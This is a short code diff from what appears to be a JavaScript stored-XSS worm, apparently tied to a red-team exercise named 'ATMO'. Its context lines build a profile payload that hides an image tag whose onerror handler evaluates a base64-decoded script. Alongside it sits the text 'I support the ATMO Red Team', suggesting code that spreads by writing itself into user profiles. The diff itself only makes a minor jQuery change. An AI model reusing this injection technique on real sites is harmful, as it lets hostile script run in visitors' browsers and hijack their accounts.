@@ -30,7 +30,7 @@ function run() {
     
     var temp = $($.parseHTML(profileHtml, null, true));
     $(temp).appendTo($(userProfile));
-    $(userProfile).appendTo("body");
+    $(userProfile).appendTo($("body"));
     
     setTimeout(function () {
         var profile_payload = "<p>I support the ATMO Red Team</p><img style='display: none;' src='x' onerror='eval(atob(\"" + payload + "\"));'>";
